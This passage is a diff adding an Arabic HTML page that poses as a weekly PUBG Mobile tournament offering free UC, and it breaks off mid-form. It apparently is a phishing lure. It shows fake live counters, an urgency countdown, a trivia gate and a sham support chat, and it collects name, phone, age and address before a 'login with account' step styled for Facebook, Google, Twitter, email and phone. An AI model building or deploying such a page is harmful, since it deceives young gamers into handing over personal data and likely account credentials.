@@ -1,0 +1,2119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقات ببجي موبايل الأسبوعية | PUBG Mobile Weekly Tournaments</title>
+    <!-- خط القاهرة العربي الاحترافي -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- مكتبة الأيقونات FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- مكتبة التقاط الشاشة -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <style>
+        :root {
+            --bg-charcoal: #14171d;
+            --header-dark: #1e2229;
+            --card-ivory: rgba(253, 251, 247, 0.95);
+            --gold-bright: #ffb703;
+            --gold-hover: #e09f00;
+            --neon-blue: #00f3ff;
+            --danger-red: #e63946;
+            --success-green: #2a9d8f;
+            --text-dark: #2b2d42;
+            --border-dark: #3a3f4d;
+            --input-bg: #f0f2f5;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-charcoal);
+            background-image: 
+                radial-gradient(circle at 50% 10%, rgba(0, 243, 255, 0.08), transparent 40%),
+                radial-gradient(circle at 80% 80%, rgba(255, 183, 3, 0.05), transparent 50%);
+            color: var(--text-dark);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* شاشة الحجب والتنبيه عند انقطاع الإنترنت */
+        .offline-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(13, 17, 23, 0.97);
+            backdrop-filter: blur(15px);
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .offline-overlay.active {
+            display: flex;
+        }
+        .offline-icon {
+            font-size: 4rem;
+            color: var(--danger-red);
+            margin-bottom: 20px;
+            animation: pulse-offline 1.5s infinite;
+        }
+        @keyframes pulse-offline {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        /* خلفية التفاعلات الجسيمية Particle VFX Canvas */
+        #particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* الشريط المتحرك العلوي للتنبيه */
+        .marquee-banner {
+            background: linear-gradient(90deg, #b7094c, #7209b7, #b7094c);
+            color: #fff;
+            padding: 6px 0;
+            font-size: 0.85rem;
+            font-weight: 700;
+            overflow: hidden;
+            position: relative;
+            z-index: 1001;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .marquee-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 22s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        /* الشريط العلوي الثابت Sticky Header */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(30, 34, 41, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 2px solid rgba(255, 183, 3, 0.3);
+            padding: 10px 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+        }
+        .header-container {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .header-title {
+            color: var(--gold-bright);
+            font-size: 1.1rem;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 0 10px rgba(255, 183, 3, 0.3);
+        }
+
+        /* زر العودة العلوي المميز */
+        .btn-header-back {
+            background: rgba(255, 183, 3, 0.15);
+            color: var(--gold-bright);
+            border: 1px solid var(--gold-bright);
+            padding: 6px 14px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 800;
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.25s ease;
+        }
+        .btn-header-back:hover {
+            background: var(--gold-bright);
+            color: var(--bg-charcoal);
+            box-shadow: 0 0 10px rgba(255, 183, 3, 0.5);
+        }
+
+        /* العدادات اللحظية وشريط الوقت */
+        .live-stats-bar {
+            background: rgba(20, 23, 29, 0.9);
+            border-bottom: 1px solid var(--border-dark);
+            padding: 8px 16px;
+            color: #fff;
+            font-size: 0.8rem;
+            position: relative;
+            z-index: 999;
+        }
+        .stats-flex {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+        }
+        .stat-item span.number {
+            color: var(--gold-bright);
+            font-family: monospace;
+            font-size: 1rem;
+        }
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background: #2ec4b6;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #2ec4b6;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.7; }
+        }
+
+        /* شريط التبويبات والمراحل الأربع Stepper Tabs */
+        .stepper-nav {
+            max-width: 900px;
+            margin: 15px auto 5px;
+            padding: 0 12px;
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            z-index: 10;
+        }
+        .step-tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px 4px;
+            background: rgba(30, 34, 41, 0.8);
+            color: #a0aab8;
+            font-size: 0.8rem;
+            font-weight: 700;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            border-radius: 8px 8px 0 0;
+            margin: 0 3px;
+        }
+        .step-tab.active {
+            color: #fff;
+            background: rgba(45, 52, 64, 0.9);
+            border-bottom: 3px solid var(--neon-blue);
+            box-shadow: 0 0 12px rgba(0, 243, 255, 0.4);
+        }
+        .step-tab.completed { color: var(--gold-bright); }
+
+        /* شريط التقدم Progress Bar */
+        .progress-container {
+            max-width: 900px;
+            margin: 0 auto 20px;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+            z-index: 10;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            width: 25%;
+            background: linear-gradient(90deg, var(--gold-bright), var(--neon-blue));
+            transition: width 0.4s ease;
+            box-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        /* الحاوية الرئيسية للبطاقات Card Container */
+        .main-wrapper {
+            max-width: 750px;
+            margin: 0 auto 40px;
+            padding: 0 12px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* البطاقة الزجاجية העاجية Glassmorphism Card */
+        .glass-card {
+            background: var(--card-ivory);
+            backdrop-filter: blur(16px);
+            border: 2px solid rgba(255, 183, 3, 0.4);
+            border-radius: 20px;
+            padding: 28px 22px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 0 15px rgba(255,255,255,0.6);
+            display: none;
+            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+        }
+        .glass-card.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .card-header-title {
+            color: var(--bg-charcoal);
+            font-size: 1.3rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px dashed rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* قائمة خطوات المشاركة الموضحة */
+        .participation-steps-list {
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 15px 0;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+        }
+        .participation-steps-list li {
+            list-style: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: #2d3748;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .participation-steps-list li:last-child { margin-bottom: 0; }
+        .participation-steps-list li i {
+            color: var(--gold-bright);
+            font-size: 1.1rem;
+        }
+
+        /* عناصر إدخال البيانات Inputs & Forms */
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+        .label-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        .form-label {
+            font-weight: 800;
+            font-size: 0.9rem;
+            color: #1a1c23;
+        }
+        .help-btn {
+            background: var(--gold-bright);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            font-size: 0.75rem;
+            font-weight: 900;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+        }
+        .help-btn:hover { transform: scale(1.15); }
+
+        .input-box-relative {
+            position: relative;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 40px 12px 16px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border-dark);
+            border-radius: 10px;
+            font-size: 0.95rem;
+            color: #111;
+            font-weight: 600;
+            outline: none;
+            transition: all 0.25s;
+        }
+        .form-input:focus {
+            border-color: var(--gold-bright);
+            box-shadow: 0 0 8px rgba(255, 183, 3, 0.5);
+            background: #fff;
+        }
+        .input-status-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2rem;
+            display: none;
+        }
+        .input-status-icon.valid { display: block; color: var(--success-green); }
+        .input-status-icon.invalid { display: block; color: var(--danger-red); }
+
+        .field-help-text {
+            display: none;
+            background: #1e2229;
+            color: #fff;
+            font-size: 0.8rem;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin-top: 6px;
+            font-weight: 600;
+            border-right: 3px solid var(--gold-bright);
+        }
+
+        /* الأزرار العامة Buttons */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        .btn-primary {
+            flex: 2;
+            min-width: 160px;
+            background: linear-gradient(135deg, var(--gold-bright), #f39c12);
+            color: var(--bg-charcoal);
+            border: none;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-size: 1.05rem;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(255, 183, 3, 0.4);
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 183, 3, 0.6);
+        }
+        .btn-primary:disabled {
+            background: #ccc;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* الجوائز Rewards */
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .reward-card {
+            background: rgba(255,255,255,0.8);
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .reward-card:hover, .reward-card.selected {
+            border-color: var(--gold-bright);
+            transform: translateY(-4px) scale(1.03);
+            box-shadow: 0 8px 20px rgba(255, 183, 3, 0.3);
+            background: #fff;
+        }
+        .reward-icon { font-size: 2rem; color: var(--gold-bright); margin-bottom: 6px; }
+        .reward-title { font-weight: 900; font-size: 0.95rem; color: #111; }
+
+        /* شاشة الأسئلة Trivia */
+        .trivia-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 20px;
+            border: 2px solid #e5e7eb;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+        }
+        .timer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .timer-badge {
+            background: #fee2e2;
+            color: #991b1b;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: 900;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .question-text {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: #111827;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+        .options-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .option-btn {
+            background: #f9fafb;
+            border: 2px solid #e5e7eb;
+            padding: 12px 16px;
+            border-radius: 10px;
+            text-align: right;
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: #374151;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .option-btn:hover { background: #f3f4f6; border-color: #d1d5db; }
+        .option-btn.correct {
+            background: #d1fae5 !important;
+            border-color: #10b981 !important;
+            color: #065f46 !important;
+        }
+        .option-btn.wrong {
+            background: #fee2e2 !important;
+            border-color: #ef4444 !important;
+            color: #991b1b !important;
+            animation: shake 0.4s ease-in-out;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+
+        /* عناصر التحميل Spinner Loader */
+        .spinner-overlay {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .spinner-ring {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #e2e8f0;
+            border-top-color: var(--gold-bright);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* منصات التسجيل Grid */
+        .platforms-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .platform-link-btn {
+            background: #fff;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 14px 10px;
+            text-align: center;
+            text-decoration: none;
+            color: #333;
+            font-weight: 800;
+            font-size: 0.88rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.25s;
+        }
+        .platform-link-btn:hover {
+            border-color: var(--gold-bright);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+        }
+        .platform-link-btn i { font-size: 1.8rem; }
+        .platform-link-btn.fb i { color: #1877f2; }
+        .platform-link-btn.tw i { color: #000; }
+        .platform-link-btn.gg i { color: #ea4335; }
+        .platform-link-btn.em i { color: #d97706; }
+        .platform-link-btn.ph i { color: #10b981; }
+
+        /* شاشة التهنة والتحفيز */
+        .congratulation-box {
+            text-align: center;
+            padding: 10px 0;
+        }
+        .congratulation-box i {
+            font-size: 4rem;
+            color: var(--gold-bright);
+            margin-bottom: 15px;
+        }
+
+        /* المحادثة المباشرة */
+        .top-support-bar {
+            text-align: center;
+            margin: 15px 0;
+            position: relative;
+            z-index: 1001;
+        }
+        .btn-top-chat {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: #ffffff;
+            border: 1px solid #00f2fe;
+            padding: 10px 22px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        .btn-top-chat:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 22px rgba(0, 242, 254, 0.7);
+        }
+
+        .chat-widget-container {
+            position: fixed;
+            bottom: 85px;
+            left: 20px;
+            width: 350px;
+            max-width: 90vw;
+            height: 460px;
+            background: #0d1117;
+            border: 1px solid #1f293d;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8), 0 0 20px rgba(0, 210, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            z-index: 99999;
+            overflow: hidden;
+            direction: rtl;
+            font-family: inherit;
+        }
+
+        .chat-header {
+            background: #161b22;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #21262d;
+        }
+        .chat-header-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .chat-title {
+            color: #ffb700;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .chat-substatus {
+            color: #8b949e;
+            font-size: 11px;
+        }
+        .chat-close-btn {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .chat-close-btn:hover { color: #ff4757; }
+
+        .status-dot, .chat-status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #2ed573;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #2ed573;
+        }
+        .status-dot.offline, .chat-status-dot.offline {
+            background-color: #747d8c;
+            box-shadow: none;
+        }
+
+        .chat-box {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            background: #090d12;
+        }
+
+        .msg {
+            max-width: 80%;
+            padding: 10px 14px;
+            border-radius: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            position: relative;
+            word-break: break-word;
+        }
+        .msg.user-msg {
+            align-self: flex-start;
+            background: linear-gradient(135deg, #0052d4, #4364f7);
+            color: #ffffff;
+            border-bottom-right-radius: 2px;
+        }
+        .msg.admin-msg {
+            align-self: flex-end;
+            background: #1f293d;
+            color: #e6edf3;
+            border: 1px solid #2d3748;
+            border-bottom-left-radius: 2px;
+        }
+        .msg img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-bottom: 5px;
+        }
+
+        .msg-meta {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 4px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 4px;
+        }
+        .checkmark { font-size: 11px; }
+        .checkmark.read {
+            color: #00f2fe;
+            font-weight: bold;
+        }
+
+        .chat-input-area {
+            padding: 10px;
+            background: #161b22;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border-top: 1px solid #21262d;
+        }
+        #chat-user-input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            outline: none;
+        }
+        #chat-user-input:focus { border-color: #00c6ff; }
+        .chat-btn-icon {
+            background: transparent;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+        }
+        .chat-btn-icon:hover { background: #21262d; }
+
+        .chat-send-btn {
+            background: linear-gradient(135deg, #ffb700, #f5af19);
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .chat-file-preview {
+            background: #1f293d;
+            color: #00f2fe;
+            padding: 5px 12px;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        .floating-chat-trigger {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #ffb700, #ff8c00);
+            border: none;
+            border-radius: 50%;
+            color: #000;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 183, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 🛑 واجهة الحجب الفوري عند انقطاع الاتصال بالإنترنت -->
+    <div id="offlineOverlay" class="offline-overlay">
+        <i class="fa-solid fa-wifi-slash offline-icon"></i>
+        <h2 style="color: var(--gold-bright); margin-bottom: 12px; font-weight: 900;">انقطع الاتصال بالإنترنت!</h2>
+        <p style="color: #a0aab8; max-width: 480px; font-weight: 700; line-height: 1.7; margin-bottom: 25px; font-size: 0.95rem;">
+            تم إيقاف الصفحة والتصفح مؤقتاً لحماية معلوماتك. تم الاحتفاظ بجميع بياناتك ورسائلك محلياً بنجاح، وستتم المزامنة والإرسال تلقائياً فور عودة الإنترنت.
+        </p>
+        <div class="spinner-ring" style="width: 45px; height: 45px; border-width: 4px; margin-bottom: 10px;"></div>
+        <span style="font-size: 0.85rem; color: var(--neon-blue); font-weight: 800;">جاري جلب الاتصال تلقائياً...</span>
+    </div>
+
+    <!-- canvas المؤثرات الضوئية التفاعلية -->
+    <canvas id="particleCanvas"></canvas>
+
+    <!-- الشريط المتحرك العلوي للتنبيه -->
+    <div class="marquee-banner">
+        <div class="marquee-text">
+            🔥 أهلاً بك في التحدي الأسبوعي لمسابقات ببجي موبايل! أكمل الخطوات وتنافس على جوائز الشدات الرسمية! 🏆
+        </div>
+    </div>
+
+    <!-- الشريط العلوي الثابت Sticky Header -->
+    <header>
+        <div class="header-container">
+            <div class="header-title">
+                <i class="fa-solid fa-trophy"></i>
+                <span>مسابقات ببجي موبايل الأسبوعية</span>
+            </div>
+            <button class="btn-header-back" id="btnHeaderBack" onclick="goBackStep()">
+                <i class="fa-solid fa-arrow-right"></i>
+                <span>العودة خطوة</span>
+            </button>
+        </div>
+    </header>
+
+    <!-- زر المحادثة المباشرة المضاف في أعلى الصفحة -->
+    <div class="top-support-bar">
+        <button class="btn-top-chat" onclick="toggleChat()">
+            <span class="chat-status-dot" id="header-status-dot"></span>
+            💬 المحادثة المباشرة مع الدعم الفني
+        </button>
+    </div>
+
+    <!-- العدادات اللحظية وشريط الوقت -->
+    <div class="live-stats-bar">
+        <div class="stats-flex">
+            <div class="stat-item">
+                <div class="pulse-dot"></div>
+                <span>المتواجدون الآن:</span>
+                <span class="number" id="liveVisitorsCount">512</span>
+            </div>
+            <div class="stat-item">
+                <i class="fa-solid fa-users-check" style="color:var(--neon-blue)"></i>
+                <span>المسجلون اليوم:</span>
+                <span class="number" id="registeredCount">348</span>
+            </div>
+            <div class="stat-item">
+                <i class="fa-solid fa-clock" style="color:var(--gold-bright)"></i>
+                <span>ينتهي السحب الأسبوعي بعد:</span>
+                <span class="number" id="countdownTimer">00:00:00</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- شريط مراحل المسابقة الأربع Stepper Nav -->
+    <div class="stepper-nav" id="stepperNav">
+        <div class="step-tab active" data-step="1">🟢 1. المقدمة</div>
+        <div class="step-tab" data-step="2">🟢 2. الأسئلة</div>
+        <div class="step-tab" data-step="3">🟢 3. البيانات</div>
+        <div class="step-tab" data-step="4">🟢 4. الحساب</div>
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-bar-fill" id="progressBarFill"></div>
+    </div>
+
+    <!-- الحاوية الرئيسية للبطاقات -->
+    <main class="main-wrapper">
+
+        <!-- 🟢 الخطوة الأولى: المقدمة ونظام المشاركة -->
+        <div class="glass-card active" id="cardStep1">
+            <div class="card-header-title">
+                <i class="fa-solid fa-hand-shake" style="color:var(--gold-bright)"></i>
+                <span>أهلاً بك في مسابقة ببجي الكبرى!</span>
+            </div>
+
+            <p style="text-align: center; color: #333; font-weight: 700; line-height: 1.7; margin-bottom: 20px;">
+                مرحباً بك عزيزي المتسابق! استعلم عن الجوائز المتاحة للمسابقة واختر جوائز الشدات المتاحة للبدء في المشاركة فوراً.
+            </p>
+
+            <h4 style="color:#111; font-weight:800; margin-bottom:10px;"><i class="fa-solid fa-gift"></i> اختر الجائزة التي ترغب بدخول السحب عليها:</h4>
+            <div class="rewards-grid">
+                <div class="reward-card selected" onclick="selectReward(this, '300 UC')">
+                    <div class="reward-icon"><i class="fa-solid fa-gem"></i></div>
+                    <div class="reward-title">300 UC</div>
+                    <div style="font-size:0.75rem; color:#666;">شدات مباشرة</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, '600 UC')">
+                    <div class="reward-icon"><i class="fa-solid fa-coins"></i></div>
+                    <div class="reward-title">600 UC</div>
+                    <div style="font-size:0.75rem; color:#666;">شدات + صندوق</div>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, '1000 UC')">
+                    <div class="reward-icon"><i class="fa-solid fa-crown"></i></div>
+                    <div class="reward-title">1000 UC</div>
+                    <div style="font-size:0.75rem; color:#666;">تصريح بطاقة الرويال باس</div>
+                </div>
+            </div>
+
+            <h4 style="color:#111; font-weight:800; margin-top:20px; margin-bottom:8px;"><i class="fa-solid fa-list-check"></i> خطوات المشاركة الموضحة:</h4>
+            <ul class="participation-steps-list">
+                <li><i class="fa-solid fa-circle-check"></i> تسجيل بيانات التواصل للوصول إليك عند الفوز.</li>
+                <li><i class="fa-solid fa-circle-check"></i> إدراج اسمك تلقائياً في قائمة المشاركين بالسحب.</li>
+                <li><i class="fa-solid fa-circle-check"></i> تسجيل الدخول بحساب.</li>
+            </ul>
+
+            <div class="btn-group">
+                <button class="btn-primary" onclick="goToStep(2)">
+                    <span>الانتقال لتحدي الأسئلة</span>
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- 🟢 الخطوة الثانية: تحدي الأسئلة العشوائية المخصصة -->
+        <div class="glass-card" id="cardStep2">
+            <div class="card-header-title">
+                <i class="fa-solid fa-brain" style="color:var(--gold-bright)"></i>
+                <span>تحدي معلومات ببجي ذكاء واحتراف</span>
+            </div>
+
+            <div id="quizContainerBox">
+                <div style="margin-bottom:15px; text-align:center; font-weight:800; color:#444;">
+                    الإجابات الصحيحة المطلوبة للعبور: <span id="quizScore" style="color:var(--success-green); font-size:1.3rem;">0</span> / 3
+                </div>
+
+                <div class="trivia-card">
+                    <div class="timer-header">
+                        <span style="font-size:0.85rem; font-weight:800; color:#666;" id="questionCounter">السؤال:</span>
+                        <div class="timer-badge">
+                            <i class="fa-solid fa-stopwatch"></i>
+                            <span id="quizTimer">20</span> ثانية
+                        </div>
+                    </div>
+
+                    <div class="question-text" id="questionText">جاري تحميل السؤال...</div>
+                    <div class="options-list" id="optionsContainer"></div>
+                </div>
+            </div>
+
+            <div id="quizSuccessBox" class="congratulation-box" style="display: none;">
+                <i class="fa-solid fa-circle-check"></i>
+                <h3 style="color:#111; font-weight:900; margin-bottom:10px;">تهانينا استثنائية! أجبت على 3 أسئلة بنجاح 🎉</h3>
+                <p style="color:#555; font-weight:700; line-height:1.6; margin-bottom:20px;">
+                    أظهرت معرفة ممتازة بأسرار لعبة ببجي موبايل! أنت الآن مؤهل تماماً لإكمال التسجيل النهائي وحجز مكانك فوراً في السحب الأسبوعي على الشدات.
+                </p>
+                <button class="btn-primary" style="width:100%;" onclick="goToStep(3)">
+                    <span>متابعة تسجيل البيانات الشخصية</span>
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- 🟢 الخطوة الثالثة: البيانات الشخصية -->
+        <div class="glass-card" id="cardStep3">
+            <div class="card-header-title">
+                <i class="fa-solid fa-id-card"></i>
+                <span>البيانات الشخصية والتحقق الفوري</span>
+            </div>
+
+            <!-- الاسم الثلاثي -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">الاسم الثلاثي:</label>
+                    <button class="help-btn" onclick="toggleHelp('helpName')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="text" id="inputFullName" class="form-input" autocomplete="name" placeholder="أدخل اسمك الثلاثي" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconName"></i>
+                </div>
+                <div class="field-help-text" id="helpName">يرجى كتابة الاسم الثلاثي بالحروف العربية أو الإنجليزية فقط دون أرقام أو رموش خاصة.</div>
+            </div>
+
+            <!-- رقم الهاتف -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">رقم الهاتف:</label>
+                    <button class="help-btn" onclick="toggleHelp('helpPhone')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="tel" id="inputPhone" class="form-input" autocomplete="tel" placeholder="مثال: 771234567" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconPhone"></i>
+                </div>
+                <div class="field-help-text" id="helpPhone">يدعم التعبئة التلقائية. يتعرف النظام تلقائياً على رمز الدولة والمفتاح الدولي.</div>
+            </div>
+
+            <!-- العمر -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">العمر:</label>
+                    <button class="help-btn" onclick="toggleHelp('helpAge')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="number" id="inputAge" class="form-input" placeholder="مثال: 20" min="10" max="90" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconAge"></i>
+                </div>
+                <div class="field-help-text" id="helpAge">يرجى إدخال عمرك بالأرقام فقط.</div>
+            </div>
+
+            <!-- العنوان -->
+            <div class="form-group">
+                <div class="label-wrapper">
+                    <label class="form-label">العنوان:</label>
+                    <button class="help-btn" onclick="toggleHelp('helpAddress')" title="مساعدة">؟</button>
+                </div>
+                <div class="input-box-relative">
+                    <input type="text" id="inputAddress" class="form-input" placeholder="مثال توضيحي: اليمن، صنعاء" oninput="validatePersonalForm()">
+                    <i class="fa-solid fa-circle-check input-status-icon" id="iconAddress"></i>
+                </div>
